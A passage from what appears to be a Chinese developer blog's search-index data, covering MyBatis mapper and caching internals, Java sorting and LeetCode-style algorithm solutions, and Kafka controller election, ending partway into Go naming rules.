&#x27;mapperInterface&#x27; is required&quot;); Configuration configuration = getSqlSession().getConfiguration(); if (this.addToConfig &amp;&amp; !configuration.hasMapper(this.mapperInterface)) &#123; try &#123; configuration.addMapper(this.mapperInterface); &#125; catch (Exception e) &#123; logger.error(&quot;Error while adding the mapper &#x27;&quot; + this.mapperInterface + &quot;&#x27; to configuration.&quot;, e); throw new IllegalArgumentException(e); &#125; finally &#123; ErrorContext.instance().reset(); &#125; &#125;&#125; 这个方法会将这个mapperInterface放入configuration里面，主要的是configuration.addMapper(this.mapperInterface);方法，里面调用了mapperRegistry.addMapper()方法，这个方法new了一个MapperProxyFactory代理工厂类放到了knownMappers这个Concur rentHashMap里面用来后面获取，然后会声明一个MapperAnnotationBuilder对我们的mapper对象和xml文件进行解析。 12345678910111213141516171819202122public &lt;T&gt; void addMapper(Class&lt;T&gt; type) &#123; if (type.isInterface()) &#123; if (this.hasMapper(type)) &#123; throw new BindingException(&quot;Type &quot; + type + &quot; is already known to the MapperRegistry.&quot;); &#125; boolean loadCompleted = false; try &#123; this.knownMappers.put(type, new MapperProxyFactory(type)); MapperAnnotationBuilder parser = new MapperAnnotationBuilder(this.config, type); parser.parse(); loadCompleted = true; &#125; finally &#123; if (!loadCompleted) &#123; this.knownMappers.remove(type); &#125; &#125; &#125; &#125; 以下是对于FactoryBean接口的实现 123456789101112131415161718192021 @Override public T getObject() throws Exception &#123; return getSqlSession().getMapper(this.mapperInterface); &#125; /** * &#123;@inheritDoc&#125; */ @Override public Class&lt;T&gt; getObjectType() &#123; return this.mapperInterface; &#125; /** * &#123;@inheritDoc&#125; */ @Override public boolean isSingleton() &#123; return true; &#125; 里面的getObject方法会去前面说的knownMappers获取MapperProxyFactory对象，这个对象又会返回一个MapperProxy对象，这个MapperProxy实现了InvocationHandler代理，最后调用了MapperMethod的execute(SqlSession sqlSession, Object[] args)方法。 MapperMethodMapperMethod的构造器只有一个，里面new了两个对象，其中SqlCommand主要获取name和type，MethodSignature主要对接口的参数和返回值进行解析。 1234public MapperMethod(Class&lt;?&gt; mapperInterface, Method method, Configuration config) &#123; this.command = new SqlCommand(config, mapperInterface, method); this.method = new MethodSignature(config, mapperInterface, method); &#125; 看一下execute方法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public Object execute(SqlSession sqlSession, Object[] args) &#123; Object result; switch (command.getType()) &#123; case INSERT: &#123; Object param = method.convertArgsToSqlCommandParam(args); result = rowCountResult(sqlSession.insert(command.getName(), param)); break; &#125; case UPDATE: &#123; Object param = method.convertArgsToSqlCommandParam(args); result = rowCountResult(sqlSession.update(command.getName(), param)); break; &#125; case DELETE: &#123; Object param = method.convertArgsToSqlCommandParam(args); result = rowCountResult(sqlSession.delete(command.getName(), param)); break; &#125; case SELECT: if (method.returnsVoid() &amp;&amp; method.hasResultHandler()) &#123; executeWithResultHandler(sqlSession, args); result = null; &#125; else if (method.returnsMany()) &#123; result = executeForMany(sqlSession, args); &#125; else if (method.returnsMap()) &#123; result = executeForMap(sqlSession, args); &#125; else if (method.returnsCursor()) &#123; result = executeForCursor(sqlSession, args); &#125; else &#123; Object param = method.convertArgsToSqlCommandParam(args); result = sqlSession.selectOne(command.getName(), param); if (method.returnsOptional() &amp;&amp; (result == null || !method.getReturnType().equals(result.getClass()))) &#123; result = Optional.ofNullable(result); &#125; &#125; break; case FLUSH: result = sqlSession.flushStatements(); break; default: throw new BindingException(&quot;Unknown execution method for: &quot; + command.getName()); &#125; if (result == null &amp;&amp; method.getReturnType().isPrimitive() &amp;&amp; !method.returnsVoid()) &#123; throw new BindingException(&quot;Mapper method &#x27;&quot; + command.getName() + &quot;&#x27; attempted to return null from a method with a primitive return type (&quot; + method.getReturnType() + &quot;).&quot;); &#125; return result;&#125; 主要是通过刚才获取到的type，使用sqlSession进行不同的逻辑处理，后面的逻辑是通过configuration根据statementId获取到对应的MappedStatement，然后调用不同的Executor来执行，Executor最后会生成StatementHandler来处理传进来的MappedStatement，parameter等参数，最终去执行sql，并将结果交给ResultHandler，ResultHandler对获取到的结果进行处理，至此一套mybatis的流程就到此为止了。 接下来我们看看里面的一些细节。 Executor SimpleExecutor：每执行一次update或select，就开启一个Statement对象，用完立刻关闭Statement对象。ReuseExecutor：执行update或select，以sql作为key查找Statement对象，存在就使用，不存在就创建，用完后，不关闭Statement对象，而是放置于Map内，供下一次使用。简言之，就是重复使用Statement对象。BatchExecutor：执行update（没有select，JDBC批处理不支持select），将所有sql都添加到批处理中（addBatch()），等待统一执行（executeBatch()），它缓存了多个Statement对象，每个Statement对象都是addBatch()完毕后，等待逐一执行executeBatch()批处理。与JDBC批处理相同。 CachingExecutor：CachingExecutor是一个Executor接口的装饰器，它为Executor对象增加了二级缓存的相关功能，委托的执行器对象可以是SimpleExecutor、ReuseExecutor、BatchExecutor中任一一个。执行 update 方法前判断是否清空二级缓存；执行 query 方法前先在二级缓存中查询，命中失败再通过被代理类查询。 缓存一级缓存首先一级缓存的作用域是一个sqlSession里面，sqlSession会使用Executor来做数据库的一些操作，而一级缓存就是抽象类BaseExecutor的一个成员变量，取名交作localCache。 1protected PerpetualCache localCache; 看一下PerpetualCache的变量，会发现里面是用HashMap来做的缓存。 123private final String id;private final Map&lt;Object, Object&gt; cache = new HashMap&lt;&gt;(); 首选需要初始化SqlSession 1234567891011121314151617private SqlSession openSessionFromDataSource(ExecutorType execType, TransactionIsolationLevel level, boolean autoCommit) &#123; Transaction tx = null; try &#123; final Environment environment = configuration.getEnvironment(); final TransactionFactory transactionFactory = getTransactionFactoryFromEnvironment(environment); tx = transactionFactory.newTransaction(environment.getDataSource(), level, autoCommit); // 这里会去生成一个Executor final Executor executor = configuration.newExecutor(tx, execType); return new DefaultSqlSession(configuration, executor, autoCommit); &#125; catch (Exception e) &#123; closeTransaction(tx); // may have fetched a connection so lets call close() throw ExceptionFactory.wrapException(&quot;Error opening session. Cause: &quot; + e, e); &#125; finally &#123; ErrorContext.instance().reset(); &#125; &#125; 初始化SqlSession的时候，他会创建一个Executor，创建的代码如下： 12345678910111213141516public Executor newExecutor(Transaction transaction, ExecutorType executorType) &#123; executorType = executorType == null ? defaultExecutorType : executorType; Executor executor; if (ExecutorType.BATCH == executorType) &#123; executor = new BatchExecutor(this, transaction); &#125; else if (ExecutorType.REUSE == executorType) &#123; executor = new ReuseExecutor(this, transaction); &#125; else &#123; executor = new SimpleExecutor(this, transaction); &#125; // 如果启用二级缓存，那么就是CachingExecutor这个 if (cacheEnabled) &#123; executor = new CachingExecutor(executor); &#125; return (Executor) interceptorChain.pluginAll(executor);&#125; Executor负责处理和数据库打交道，如果是select查询的话，会走到query方法。 1234567@Overridepublic &lt;E&gt; List&lt;E&gt; query(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler) throws SQLException &#123; BoundSql boundSql = ms.getBoundSql(parameter); CacheKey key = createCacheKey(ms, parameter, rowBounds, boundSql); return query(ms, parameter, rowBounds, resultHandler, key, boundSql);&#125; query方法会去创建一个CacheKey，创建过程如下： 123456789101112131415161718192021222324252627282930313233343536373839@Overridepublic CacheKey createCacheKey(MappedStatement ms, Object parameterObject, RowBounds rowBounds, BoundSql boundSql) &#123; if (closed) &#123; throw new ExecutorException(&quot;Executor was closed.&quot;); &#125; CacheKey cacheKey = new CacheKey(); cacheKey.update(ms.getId()); cacheKey.update(rowBounds.getOffset()); cacheKey.update(rowBounds.getLimit()); cacheKey.update(boundSql.getSql()); List&lt;ParameterMapping&gt; parameterMappings = boundSql.getParameterMappings(); TypeHandlerRegistry typeHandlerRegistry = ms.getConfiguration().getTypeHandlerRegistry(); // mimic DefaultParameterHandler logic MetaObject metaObject = null; for (ParameterMapping parameterMapping : parameterMappings) &#123; if (parameterMapping.getMode() != ParameterMode.OUT) &#123; Object value; String propertyName = parameterMapping.getProperty(); if (boundSql.hasAdditionalParameter(propertyName)) &#123; value = boundSql.getAdditionalParameter(propertyName); &#125; else if (parameterObject == null) &#123; value = null; &#125; else if (typeHandlerRegistry.hasTypeHandler(parameterObject.getClass())) &#123; value = parameterObject; &#125; else &#123; if (metaObject == null) &#123; metaObject = configuration.newMetaObject(parameterObject); &#125; value = metaObject.getValue(propertyName); &#125; cacheKey.update(value); &#125; &#125; if (configuration.getEnvironment() != null) &#123; // issue #176 cacheKey.update(configuration.getEnvironment().getId()); &#125; return cacheKey;&#125; 可以看到CacheKey的id是通过MapperStatement的id、offset、limit、sql还有参数来决定的。 继续往下走会发现使用缓存的地方，如果存在缓存就直接使用缓存，否则就使用queryFromDatabase方法去数据库进行查询。 123456list = resultHandler == null ? (List&lt;E&gt;) localCache.getObject(key) : null;if (list != null) &#123; handleLocallyCachedOutputParameters(ms, key, parameter, boundSql);&#125; else &#123; list = queryFromDatabase(ms, parameter, rowBounds, resultHandler, key, boundSql);&#125; 并且在query方法的最后，如果开起了二级缓存，则清空一级缓存的数据。 1234if (configuration.getLocalCacheScope() == LocalCacheScope.STATEMENT) &#123; // issue #482 clearLocalCache(); &#125; queryFromDatabase方法里面对一级缓存做了操作，将doQuery的查询结果放入一级缓存里面，如果doQuery报错了，还是会remove掉一级缓存的数据。 123456789101112131415private &lt;E&gt; List&lt;E&gt; queryFromDatabase(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql) throws SQLException &#123; List&lt;E&gt; list; localCache.putObject(key, EXECUTION_PLACEHOLDER); try &#123; list = doQuery(ms, parameter, rowBounds, resultHandler, boundSql); &#125; finally &#123; localCache.removeObject(key); &#125; localCache.putObject(key, list); if (ms.getStatementType() == StatementType.CALLABLE) &#123; localOutputParameterCache.putObject(key, parameter); &#125; return list;&#125; 这就是一级缓存的查询逻辑，那么如果是insert、delete、update呢？ 在进行insert、delete、update的时候，最终都会走到Executor的update方法，而这个方法里面都会在提交sql之前执行clearLocalCache()方法来清理一级缓存的内容。 123456789@Override public int update(MappedStatement ms, Object parameter) throws SQLException &#123; ErrorContext.instance().resource(ms.getResource()).activity(&quot;executing an update&quot;).object(ms.getId()); if (closed) &#123; throw new ExecutorException(&quot;Executor was closed.&quot;); &#125; clearLocalCache(); return doUpdate(ms, parameter); &#125; 二级缓存开启二级缓存 1&lt;setting name=&quot;cacheEnabled&quot; value=&quot;true&quot;/&gt; 二级缓存主要是类CachingExecutor，在前面说到创建Executor的时候，当开启二级缓存的时候CachingExecutor对平常的Executor做了一个封装。 看一下他的query方法。 12345678910111213141516171819@Override public &lt;E&gt; List&lt;E&gt; query(MappedStatement ms, Object parameterObject, RowBounds rowBounds, ResultHandler resultHandler, CacheKey key, BoundSql boundSql) throws SQLException &#123; Cache cache = ms.getCache(); if (cache != null) &#123; flushCacheIfRequired(ms); if (ms.isUseCache() &amp;&amp; resultHandler == null) &#123; ensureNoOutParams(ms, boundSql); @SuppressWarnings(&quot;unchecked&quot;) List&lt;E&gt; list = (List&lt;E&gt;) tcm.getObject(cache, key); if (list == null) &#123; list = delegate.query(ms, parameterObject, rowBounds, resultHandler, key, boundSql); tcm.putObject(cache, key, list); // issue #578 and #116 &#125; return list; &#125; &#125; return delegate.query(ms, parameterObject, rowBounds, resultHandler, key, boundSql); &#125; 首先会从MappedStatement里面获取Cache，这个Cache是链式结构，里面有很多的Cache实现，拥有不同的逻辑实现。 SynchronizedCache：同步Cache，实现比较简单，直接使用synchronized修饰方法。 LoggingCache：日志功能，装饰类，用于记录缓存的命中率，如果开启了DEBUG模式，则会输出命中率日志。 SerializedCache：序列化功能，将值序列化后存到缓存中。该功能用于缓存返回一份实例的Copy，用于保存线程安全。 LruCache：采用了Lru算法的Cache实现，移除最近最少使用的Key/Value。 PerpetualCache： 作为为最基础的缓存类，底层实现比较简单，直接使用了HashMap。 具体的详细解析可以参考美团的文档。 参考链接 Mybatis都有哪些Executor执行器？它们之间的区别是什么？ 聊聊MyBatis缓存机制","categories":[{"name":"mybatis","slug":"mybatis","permalink":"http://fireflyingup.github.io/categories/mybatis/"}],"tags":[{"name":"mybatis","slug":"mybatis","permalink":"http://fireflyingup.github.io/tags/mybatis/"}]},{"title":"算法与数据结构","slug":"algorithm","date":"2023-04-28T02:09:01.000Z","updated":"2024-01-10T08:30:41.883Z","comments":true,"path":"2023/04/28/algorithm/","link":"","permalink":"http://fireflyingup.github.io/2023/04/28/algorithm/","excerpt":"","text":"排序 冒泡排序冒泡排序的思想是相邻两个数进行大小比较，一步一步的将大的数往后移动，每次循环得到未排序数组里面的最大值。 123456789101112131415public void sort(int[] array) &#123; int length = array.length; for (int i = 0; i &lt; length - 1; i++) &#123; boolean flag = true; for (int j = 0; j &lt; length - 1; j++) &#123; if (array[j] &gt; array[j + 1]) &#123; int temp = array[j]; array[j] = array[j + 1]; array[j + 1] = temp; flag = false; &#125; &#125; if (flag) return; &#125;&#125; 时间复杂度：升序的时候最好O(n)，降序的时候最坏O(n^2)，平均时间复杂度O(n^2)。 空间复杂度：O(1)。 选择排序选择排序的思想是在剩余的未排序数组里面每次选取最小的放入未排序数组的最前方，重复此步骤，直到排序完成，所以选择排序的时间复杂度很固定。 1234567891011121314public void sort(int[] array) &#123; int length = array.length; for (int i = 0; i &lt; length - 1; i++) &#123; int minIndex = i; for (int j = i + 1; j &lt; length; j++) &#123; if (array[j] &lt; array[minIndex]) &#123; minIndex = j; &#125; &#125; int temp = array[i]; array[i] = array[minIndex]; array[minIndex] = temp; &#125;&#125; 时间复杂度：O(n) 空间复杂度：O(1) 插入排序插入排序的思路和打扑克牌的抓牌时候一样，每次抓牌从手牌右到左比较，遇到比自己小的就插入进去，所以时间复杂度不固定，当是增序的时候每次插入最右边，时间复杂度为O(n)，反之则时间复杂度更高为O(n^2)。 123456789101112public void sort(int[] array) &#123; int length = array.length; for (int i = 1; i &lt; length; i++) &#123; int j = i - 1; int temp = array[i]; while (j &gt;= 0 &amp;&amp; array[j] &gt; temp) &#123; array[j + 1] = array[j]; j--; &#125; array[j + 1] = temp; &#125;&#125; 归并排序归并排序的思想是一种分而治之的思想，将一个大的数组分成2部分，每个部分在继续分成两部分，递归直到不能分的时候，然后将子方法获取到的两个部分就是有序的两个数组 采取双指针法 进行排序。 123456789101112131415161718192021222324252627public static int[] sort(int[] arrays) &#123; int length = arrays.length; if (length &lt; 2) &#123; return arrays; &#125; int middle = length/2; int[] left = Arrays.copyOfRange(arrays, 0, middle); int[] right = Arrays.copyOfRange(arrays, middle, length); return merge(sort(left), sort(right));&#125;public static int[] merge(int[] left, int[] right) &#123; int[] target = new int[left.length + right.length]; int i = 0, j = 0, index = 0; while (i &lt; left.length || j &lt; right.length) &#123; if (i == left.length) &#123; target[index++] = right[j++]; &#125; else if (j == right.length) &#123; target[index++] = left[i++]; &#125; else if (left[i] &lt; right[j]) &#123; target[index++] = left[i++]; &#125; else &#123; target[index++] = right[j++]; &#125; &#125; return target;&#125; 时间复杂度：O(nlogn) 空间复杂度：O(n) 快速排序 从数列中挑出一个元素，称为 “基准”（pivot）; 重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作； 递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序； 12345678910111213141516171819202122232425262728public static int[] sort(int[] arrays, int left, int right) &#123; if (left &lt; right) &#123; int partition = partition(arrays, left, right); sort(arrays, left, partition - 1); sort(arrays, partition + 1, right); &#125; return arrays; &#125; public static int partition(int[] array, int left, int right) &#123; int index = left + 1; for (int i = index; i &lt;= right; i++) &#123; if (array[left] &gt; array[i]) &#123; swap(array, index, i); index++; &#125; &#125; if (array[left] &gt; array[index]) &#123; swap(array, left, index); &#125; return index - 1; &#125; public static void swap(int[] array, int left, int right) &#123; int temp = array[left]; array[left] = array[right]; array[right] = temp; &#125; 123456789101112131415161718192021222324252627282930public static int[] sort1(int[] arrays, int left, int right) &#123; if (left &lt; right) &#123; int partition = partition1(arrays, left, right); sort1(arrays, left, partition - 1); sort1(arrays, partition + 1, right); &#125; return arrays; &#125; public static int partition1(int[] array, int left, int right) &#123; int l = left; int r = right; while (l &lt; r) &#123; while (l &lt; r &amp;&amp; array[l] &lt; array[left]) &#123; l++; &#125; while (l &lt; r &amp;&amp; array[r] &gt;= array[left]) &#123; r--; &#125; swap(array, l, r); &#125; swap(array, l, left); return l; &#125; public static void swap(int[] array, int left, int right) &#123; int temp = array[left]; array[left] = array[right]; array[right] = temp; &#125; 时间复杂度O(nlogn) 空间复杂度O(logn) 链表21.合并两个有序列表将两个升序链表合并为一个新的 升序 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 示例 1： 12输入：l1 &#x3D; [1,2,4], l2 &#x3D; [1,3,4]输出：[1,1,2,3,4,4] 示例 2： 12输入：l1 &#x3D; [], l2 &#x3D; []输出：[] 示例 3： 12输入：l1 &#x3D; [], l2 &#x3D; [0]输出：[0] 12345678910111213141516171819202122232425262728public ListNode mergeTwoLists(ListNode list1, ListNode list2) &#123; if (list1 == null) return list2; if (list2 == null) return list1; ListNode target = new ListNode(); ListNode current = target; for (; ; ) &#123; // 如果list1链表为空 直接挂list2在后面 if (list1 == null) &#123; current.next = list2; break; &#125; // 如果list2链表为空 直接挂list1在后面 if (list2 == null) &#123; current.next = list1; break; &#125; if (list1.val &lt; list2.val) &#123; current.next = list1; list1 = list1.next; &#125; else &#123; current.next = list2; list2 = list2.next; &#125; current = current.next; &#125; return target.next;&#125; 23.合并k个升序链表给你一个链表数组，每个链表都已经按升序排列。 请你将所有链表合并到一个升序链表中，返回合并后的链表。 示例 1： 12345678910输入：lists &#x3D; [[1,4,5],[1,3,4],[2,6]]输出：[1,1,2,3,4,4,5,6]解释：链表数组如下：[ 1-&gt;4-&gt;5, 1-&gt;3-&gt;4, 2-&gt;6]将它们合并到一个有序链表中得到。1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6 示例 2： 12输入：lists &#x3D; []输出：[] 示例 3： 12输入：lists &#x3D; [[]]输出：[] 1234567891011121314151617181920212223242526272829303132333435363738394041424344public ListNode mergeKLists(ListNode[] lists) &#123; if (lists.length == 0) return null; if (lists.length == 1) return lists[0]; return dep(lists);&#125;public ListNode dep(ListNode[] listNodes) &#123; int length = listNodes.length; if (length == 1) return listNodes[0]; if (length == 2) return mergeTwoLists(listNodes[0], listNodes[1]); int middle = length/2; ListNode left = dep(Arrays.copyOfRange(listNodes, 0, middle)); ListNode right = dep(Arrays.copyOfRange(listNodes, middle, length)); return mergeTwoLists(left, right);&#125;public ListNode mergeTwoLists(ListNode list1, ListNode list2) &#123; if (list1 == null) return list2; if (list2 == null) return list1; ListNode target = new ListNode(); ListNode current = target; for (; ; ) &#123; if (list1 == null) &#123; current.next = list2; break; &#125; if (list2 == null) &#123; current.next = list1; break; &#125; if (list1.val &lt; list2.val) &#123; current.next = list1; current = current.next; list1 = list1.next; &#125; else &#123; current.next = list2; current = current.next; list2 = list2.next; &#125; &#125; return target.next;&#125; LCR 023.相交链表给定两个单链表的头节点 headA 和 headB ，请找出并返回两个单链表相交的起始节点。如果两个链表没有交点，返回 null 。 图示两个链表在节点 c1 开始相交： 题目数据 保证 整个链式结构中不存在环。 注意，函数返回结果后，链表必须 保持其原始结构 。 示例 1： 12345输入：intersectVal &#x3D; 8, listA &#x3D; [4,1,8,4,5], listB &#x3D; [5,0,1,8,4,5], skipA &#x3D; 2, skipB &#x3D; 3输出：Intersected at &#39;8&#39;解释：相交节点的值为 8 （注意，如果两个链表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,0,1,8,4,5]。在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。 示例 2： 12345输入：intersectVal &#x3D; 2, listA &#x3D; [0,9,1,2,4], listB &#x3D; [3,2,4], skipA &#x3D; 3, skipB &#x3D; 1输出：Intersected at &#39;2&#39;解释：相交节点的值为 2 （注意，如果两个链表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [0,9,1,2,4]，链表 B 为 [3,2,4]。在 A 中，相交节点前有 3 个节点；在 B 中，相交节点前有 1 个节点。 示例 3： 12345输入：intersectVal &#x3D; 0, listA &#x3D; [2,6,4], listB &#x3D; [1,5], skipA &#x3D; 3, skipB &#x3D; 2输出：null解释：从各自的表头开始算起，链表 A 为 [2,6,4]，链表 B 为 [1,5]。由于这两个链表不相交，所以 intersectVal 必须为 0，而 skipA 和 skipB 可以是任意值。这两个链表不相交，因此返回 null 。 1234567891011public ListNode getIntersectionNode(ListNode headA, ListNode headB) &#123; ListNode a = headA; ListNode b = headB; while (a != b) &#123; if (a == null) a = headB; else a = a.next; if (b == null) b = headA; else b = b.next; &#125; return a;&#125; 141.环形链表给你一个链表的头节点 head ，判断链表中是否有环。 如果链表中有某个节点，可以通过连续跟踪 next 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。注意：pos 不作为参数进行传递 。仅仅是为了标识链表的实际情况。 如果链表中存在环 ，则返回 true 。 否则，返回 false 。 示例 1： 123输入：head &#x3D; [3,2,0,-4], pos &#x3D; 1输出：true解释：链表中有一个环，其尾部连接到第二个节点。 123456789public boolean hasCycle(ListNode head) &#123; ListNode l = head, r = head; while (l != null &amp;&amp; l.next != null &amp;&amp; r.next != null &amp;&amp; r.next.next != null) &#123; l = l.next; r = r.next.next; if (l == r) return true; &#125; return false;&#125; 动态规划72.编辑距离题目：给你两个单词 word1 和 word2， 请返回将 word1 转换成 word2 所使用的最少操作数 。 你可以对一个单词进行如下三种操作： 插入一个字符 删除一个字符 替换一个字符 示例 1： 123456输入：word1 &#x3D; &quot;horse&quot;, word2 &#x3D; &quot;ros&quot;输出：3解释：horse -&gt; rorse (将 &#39;h&#39; 替换为 &#39;r&#39;)rorse -&gt; rose (删除 &#39;r&#39;)rose -&gt; ros (删除 &#39;e&#39;) 递推公式： 123456789对于word1的位置i和word2的位置j1、如果word1[i]和word2[j]相等，则不做任何操作。 2、D[i][j-1] 为 A 的前 i 个字符和 B 的前 j - 1 个字符编辑距离的子问题。即对于 B 的第 j 个字符，我们在 A 的末尾添加了一个相同的字符，那么 D[i][j] 最小可以为 D[i][j-1] + 1；3、D[i-1][j] 为 A 的前 i - 1 个字符和 B 的前 j 个字符编辑距离的子问题。即对于 A 的第 i 个字符，我们在 B 的末尾添加了一个相同的字符，那么 D[i][j] 最小可以为 D[i-1][j] + 1；4、D[i-1][j-1] 为 A 前 i - 1 个字符和 B 的前 j - 1 个字符编辑距离的子问题。即对于 B 的第 j 个字符，我们修改 A 的第 i 个字符使它们相同，那么 D[i][j] 最小可以为 D[i-1][j-1] + 1。特别地，如果 A 的第 i 个字符和 B 的第 j 个字符原本就相同，那么我们实际上不需要进行修改操作。在这种情况下，D[i][j] 最小可以为 D[i-1][j-1]。 123456789101112131415161718192021public int minDistance(String word1, String word2) &#123; int length1 = word1.length(); int length2 = word2.length(); int[][] dp = new int[length1 + 1][length2 + 1]; for (int i = 0; i &lt;= length1; i++) &#123; dp[i][0] = i; &#125; for (int i = 0; i &lt;= length2; i++) &#123; dp[0][i] = i; &#125; for (int i = 1; i &lt;= length1; i++) &#123; for (int j = 1; j &lt;= length2; j++) &#123; if (word1.charAt(i - 1) == word2.charAt(j - 1)) &#123; dp[i][j] = dp[i-1][j-1]; &#125; else &#123; dp[i][j] = Math.min(dp[i-1][j] + 1, Math.min(dp[i][j - 1] + 1, dp[i - 1][j - 1] + 1)); &#125; &#125; &#125; return dp[length1][length2];&#125; LCR095.最长公共子序列题目：给定两个字符串 text1 和 text2，返回这两个字符串的最长 公共子序列 的长度。如果不存在 公共子序列 ，返回 0 。 一个字符串的 子序列 是指这样一个新的字符串：它是由原字符串在不改变字符的相对顺序的情况下删除某些字符（也可以不删除任何字符）后组成的新字符串。 例如，&quot;ace&quot; 是 &quot;abcde&quot; 的子序列，但 &quot;aec&quot; 不是 &quot;abcde&quot; 的子序列。 两个字符串的 公共子序列 是这两个字符串所共同拥有的子序列。 示例 1： 123输入：text1 &#x3D; &quot;abcde&quot;, text2 &#x3D; &quot;ace&quot; 输出：3 解释：最长公共子序列是 &quot;ace&quot; ，它的长度为 3 。 123456789101112131415public int longestCommonSubsequence(String text1, String text2) &#123; int length1 = text1.length(); int length2 = text2.length(); int[][] dp = new int[length1 + 1][length2 + 1]; for (int i = 1; i &lt;= length1; i++) &#123; for (int j = 1; j &lt;= length2; j++) &#123; if (text1.charAt(i - 1) == text2.charAt(j - 1)) &#123; dp[i][j] = dp[i - 1][j - 1] + 1; &#125; else &#123; dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - 1]); &#125; &#125; &#125; return dp[length1][length2];&#125; 42.接雨水给定 n 个非负整数表示每个宽度为 1 的柱子的高度图，计算按此排列的柱子，下雨之后能接多少雨水。 示例 1： 123输入：height &#x3D; [0,1,0,2,1,0,1,3,2,1,2,1]输出：6解释：上面是由数组 [0,1,0,2,1,0,1,3,2,1,2,1] 表示的高度图，在这种情况下，可以接 6 个单位的雨水（蓝色部分表示雨水）。 示例 2： 12输入：height &#x3D; [4,2,0,3,2,5]输出：9 1234567891011121314151617181920212223242526272829303132// 解法一 动态规划// 使用一个temp数组存放每个位置能接的雨水// 从左到右 每次记录最高的max 如果当前节点（i）比max小 代表能接雨水(max-height[i])，存放在temp[i]里面。// 从右到左，每次记录最高的max 如果当前节点（i）比max小 代表能接雨水(max-height[i])，取和temp[i]相比的最小数值即temp[i] = Math.min(temp[i], max-height[i])。// temp数组的加和即为接雨水的大小 public int trap1(int[] height) &#123; if (height.length &lt; 3) &#123; return 0; &#125; int[] temp = new int[height.length]; int max = height[0]; for (int i = 0; i &lt; height.length; i++) &#123; if (height[i] &lt; max) &#123; temp[i] = max - height[i]; &#125; max = Math.max(height[i], max); &#125; max = height[height.length - 1]; for (int i = height.length - 1; i &gt;= 0; i--) &#123; if (height[i] &lt; max) &#123; temp[i] = Math.min(temp[i], max - height[i]); &#125; else &#123; temp[i] = 0; &#125; max = Math.max(height[i], max); &#125; max = 0; for (int i = 0; i &lt; temp.length; i++) &#123; max += temp[i]; &#125; return max; &#125; 12345678910111213141516171819// 解法二 双指针// 左右两个指针，指针移动的时候记录左右的最大值l_max和r_max，当l_max小于r_max的时候，说明左侧是低高度，水的深度取决于左边，即左指针向右走并计算接水量，反之则从右侧往左。 public int trap(int[] height) &#123; int l = 0, r = height.length - 1; int l_max = height[0], r_max = height[height.length - 1]; int res = 0; while (l &lt; r) &#123; l_max = Math.max(l_max, height[l]); r_max = Math.max(r_max, height[r]); if (l_max &lt; r_max) &#123; res += l_max - height[l]; l++; &#125; else &#123; res += r_max - height[r]; r--; &#125; &#125; return res; &#125; 双指针end","categories":[{"name":"算法","slug":"算法","permalink":"http://fireflyingup.github.io/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://fireflyingup.github.io/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"kafka","slug":"kafka","date":"2023-04-28T02:09:01.000Z","updated":"2024-03-12T03:27:31.587Z","comments":true,"path":"2023/04/28/kafka/","link":"","permalink":"http://fireflyingup.github.io/2023/04/28/kafka/","excerpt":"","text":"Kafka控制器选举控制器是Kafka的核心组件，它的主要作用是在Zookeeper的帮助下管理和协调整个Kafka集群。集群中任意一个Broker都能充当控制器的角色，但在运行过程中，只能有一个Broker成为控制器。 控制器的作用可以查看文末 控制器选举可以认为是Broker的选举。 集群中第一个启动的Broker会通过在Zookeeper中创建临时节点/controller来让自己成为控制器，其他Broker启动时也会在zookeeper中创建临时节点，但是发现节点已经存在，所以它们会收到一个异常，意识到控制器已经存在，那么就会在Zookeeper中创建watch对象，便于它们收到控制器变更的通知。 那么如果控制器由于网络原因与Zookeeper断开连接或者异常退出，那么其他broker通过watch收到控制器变更的通知，就会去尝试创建临时节点/controller，如果有一个Broker创建成功，那么其他broker就会收到创建异常通知，也就意味着集群中已经有了控制器，其他Broker只需创建watch对象即可。 如果集群中有一个Broker发生异常退出了，那么控制器就会检查这个broker是否有分区的副本leader，如果有那么这个分区就需要一个新的leader，此时控制器就会去遍历其他副本，决定哪一个成为新的leader，同时更新分区的ISR集合。 如果有一个Broker加入集群中，那么控制器就会通过Broker ID去判断新加入的Broker中是否含有现有分区的副本，如果有，就会从分区副本中去同步数据。 防止控制器脑裂如果控制器所在broker挂掉了或者Full GC停顿时间太长超过zookeepersession timeout出现假死，Kafka集群必须选举出新的控制器，但如果之前被取代的控制器又恢复正常了，它依旧是控制器身份，这样集群就会出现两个控制器，这就是控制器脑裂问题。 解决方法： 为了解决Controller脑裂问题，ZooKeeper中还有一个与Controller有关的持久节点/controller_epoch，存放的是一个整形值的epoch number（纪元编号，也称为隔离令牌），集群中每选举一次控制器，就会通过Zookeeper创建一个数值更大的epoch number，如果有broker收到比这个epoch数值小的数据，就会忽略消息。","categories":[{"name":"kafka","slug":"kafka","permalink":"http://fireflyingup.github.io/categories/kafka/"}],"tags":[{"name":"kafka","slug":"kafka","permalink":"http://fireflyingup.github.io/tags/kafka/"}]},{"title":"go","slug":"Go","date":"2023-04-28T02:09:01.000Z","updated":"2024-03-11T06:04:26.799Z","comments":true,"path":"2023/04/28/Go/","link":"","permalink":"http://fireflyingup.github.io/2023/04/28/Go/","excerpt":"","text":"基础命名命名规则： Go语言中的函数名、变量名、常量名、类型名、语句标号和包名等所有的命名，都遵循一个简单的命名规则：一个名字必须以一个字母（Unicode字母）或下划线开头，后面可以跟任意数量的字母、数字或下划线。 包本身的名字一般总是用小写字母，命名一般采用驼峰式，而不是用下划线分割。 关键字： 12345678910111213141516break default func interface selectcase defer go map structchan else goto package switchconst 